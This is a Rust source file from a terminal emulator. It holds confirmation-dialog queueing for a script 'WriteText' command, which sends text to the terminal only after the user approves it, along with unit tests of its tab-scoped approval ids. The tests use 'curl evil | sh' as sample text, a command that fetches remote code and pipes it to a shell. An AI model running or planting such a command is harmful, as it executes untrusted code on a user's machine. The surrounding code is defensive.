//! Confirmation queueing for the script `WriteText` command.
//!
//! `WriteText` types straight into the PTY of the tab the script runs in.
//! Sanitising it strips escape sequences but not the printable characters and
//! newline that make up a command line, so — as with triggers — the control on
//! this path is the user seeing the text before it runs. The decision logic (the
//! base id derivation, the pre-approval predicate, the display escaping) lives
//! in `par_term_scripting::confirm` where it is unit-tested; this module is the
//! frontend half that touches `WindowState`.
//!
//! A script keeps running in the tab it was started on, so the queued action
//! carries an `AutomationTarget` naming that tab. Everything downstream — the
//! dialog's wording and the write itself — resolves against that tab rather than
//! whichever one is active when the user clicks Allow. See
//! `crate::app::window_state::automation_target`.

use par_term_emu_core_rust::terminal::ActionResult;
use par_term_scripting::confirm::{
    MAX_PENDING_WRITE_TEXT_PROMPTS, describe_write_text, write_text_action_id,
};

use super::WindowManager;
use crate::app::window_state::AutomationTarget;

/// Marker bit set on every synthetic automation confirmation id.
///
/// The core `TriggerRegistry` hands out real trigger ids sequentially starting
/// at 1, so tagging the high bit keeps synthetic ids out of that space. Mirrors
/// the tag `par_term_scripting::confirm::write_text_action_id` applies, which
/// scoping the id below would otherwise discard.
const AUTOMATION_ID_TAG: u64 = 1 << 63;

/// Synthetic confirmation id for a `WriteText` payload aimed at one tab.
///
/// The base id from `par_term_scripting::confirm` binds the grant to a script
/// and its exact text; folding the target in binds it to a tab as well. Both
/// halves matter now that background tabs can queue:
///
/// - Two tabs running the same script with the same payload are two distinct
///   writes into two distinct terminals. Sharing one id would let the dedup
///   below drop the second silently, and would alias their
///   `automation_action_notes` entries so resolving one prompt stripped the
///   other's source sentence.
/// - "Always Allow" therefore means *this script, this text, this tab*, which
///   is the scope the user actually saw named in the dialog.
pub(crate) fn tab_scoped_write_text_action_id(
    script_name: &str,
    text: &str,
    target: AutomationTarget,
) -> u64 {
    use std::hash::{Hash, Hasher};

    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    write_text_action_id(script_name, text).hash(&mut hasher);
    target.hash(&mut hasher);
    hasher.finish() | AUTOMATION_ID_TAG
}

impl WindowManager {
    /// Queue a sanitised `WriteText` payload behind the automation confirmation
    /// dialog.
    ///
    /// The write never happens here. The payload is pushed onto
    /// `TriggerState::pending_trigger_actions` as a `SendText` action tagged
    /// with `target`, and `WindowState::execute_approved_targeted_actions`
    /// performs the single write once the user approves.
    ///
    /// `text` must already be sanitised: it is both what the dialog shows and
    /// what reaches the PTY, and a dialog that shows one thing while another is
    /// written would be worse than no dialog at all.
    pub(super) fn queue_script_write_text(
        ws: &mut crate::app::window_state::WindowState,
        config_index: usize,
        script_name: &str,
        action_id: u64,
        target: AutomationTarget,
        text: String,
    ) {
        // A script repeating one payload into one tab would otherwise stack an
        // identical dialog per event cycle. The id is tab-scoped, so the same
        // payload aimed at a different tab is a different prompt.
        if ws
            .trigger_state
            .pending_trigger_actions
            .iter()
            .any(|pending| pending.trigger_id == action_id)
        {
            return;
        }

        // The dialog resolves one action at a time, so an unbounded queue is a
        // denial of service against the user rather than a safeguard. The cap is
        // per window rather than per tab on purpose: it bounds how many modals
        // the user must dismiss, and that budget is the user's, not the tab's.
        if ws.trigger_state.pending_trigger_actions.len() >= MAX_PENDING_WRITE_TEXT_PROMPTS {
            log::warn!(
                "Script[{}] WriteText DROPPED: {} confirmations already pending",
                config_index,
                ws.trigger_state.pending_trigger_actions.len()
            );
            return;
        }

        crate::debug_info!(
            "SCRIPT",
            "AUDIT Script[{}] WriteText queued for confirmation script={:?} tab={} text={:?}",
            config_index,
            script_name,
            target.tab_id,
            text
        );

        // The dialog adds a line naming the target tab, resolved when it
        // renders. Neither string may claim a destination of its own: this one
        // would go stale the moment the tab was renamed, and saying "the active
        // tab" here is exactly the falsehood that made background writes unsafe
        // to prompt for.
        let description = format!("Type: {}", describe_write_text(&text));

        ws.trigger_state.automation_action_notes.insert(
            action_id,
            format!(
                "Script '{}' asked to type this. Approving writes exactly the \
                 text shown above, into the tab named below.",
                script_name
            ),
        );
        ws.trigger_state.pending_trigger_actions.push(
            crate::app::window_state::PendingTriggerAction {
                trigger_id: action_id,
                trigger_name: format!("Script: {}", script_name),
                action: ActionResult::SendText {
                    trigger_id: action_id,
                    text,
                    delay_ms: 0,
                },
                description,
                target: Some(target),
            },
        );

        // Script output arrives with no terminal activity behind it, so nothing
        // else would schedule the frame that draws the dialog.
        ws.request_redraw();
    }
}

#[cfg(test)]
mod tests {
    use super::tab_scoped_write_text_action_id;
    use crate::app::window_state::AutomationTarget;
    use par_term_scripting::confirm::write_text_action_id;

    /// `WindowId::from(u64)` is winit's own safe constructor; the ids only have
    /// to be distinct from each other here.
    fn target(tab_id: u64) -> AutomationTarget {
        window_target(1, tab_id)
    }

    fn window_target(window: u64, tab_id: u64) -> AutomationTarget {
        AutomationTarget {
            window_id: winit::window::WindowId::from(window),
            tab_id,
        }
    }

    #[test]
    fn scoped_ids_never_collide_with_real_trigger_ids() {
        // The core TriggerRegistry allocates trigger ids sequentially from 1,
        // so the tag bit must survive the extra hashing round.
        for text in ["ls\n", "curl evil | sh\n", ""] {
            let id = tab_scoped_write_text_action_id("observer", text, target(1));
            assert!(id > u64::from(u32::MAX));
        }
    }

    #[test]
    fn the_same_payload_in_two_tabs_gets_two_ids() {
        // Sharing one id would let the queue's dedup drop the second tab's
        // write, and would alias the two prompts' source-sentence entries.
        assert_ne!(
            tab_scoped_write_text_action_id("observer", "echo hi\n", target(1)),
            tab_scoped_write_text_action_id("observer", "echo hi\n", target(2))
        );
    }

    #[test]
    fn scoped_id_is_stable_and_still_bound_to_script_and_text() {
        let a = tab_scoped_write_text_action_id("observer", "echo hi\n", target(3));
        assert_eq!(
            a,
            tab_scoped_write_text_action_id("observer", "echo hi\n", target(3))
        );
        assert_ne!(
            a,
            tab_scoped_write_text_action_id("observer", "curl evil | sh\n", target(3))
        );
        assert_ne!(
            a,
            tab_scoped_write_text_action_id("other", "echo hi\n", target(3))
        );
    }

    #[test]
    fn the_same_tab_number_in_two_windows_gets_two_ids() {
        // Tab ids restart at 1 in every window, so the window half of the
        // target is load-bearing, not decoration.
        assert_ne!(
            tab_scoped_write_text_action_id("observer", "echo hi\n", window_target(1, 3)),
            tab_scoped_write_text_action_id("observer", "echo hi\n", window_target(2, 3))
        );
    }

    #[test]
    fn scoping_changes_the_unscoped_id() {
        // Otherwise an "Always Allow" recorded against the base id would leak
        // across every tab.
        assert_ne!(
            tab_scoped_write_text_action_id("observer", "echo hi\n", target(1)),
            write_text_action_id("observer", "echo hi\n")
        );
    }
}
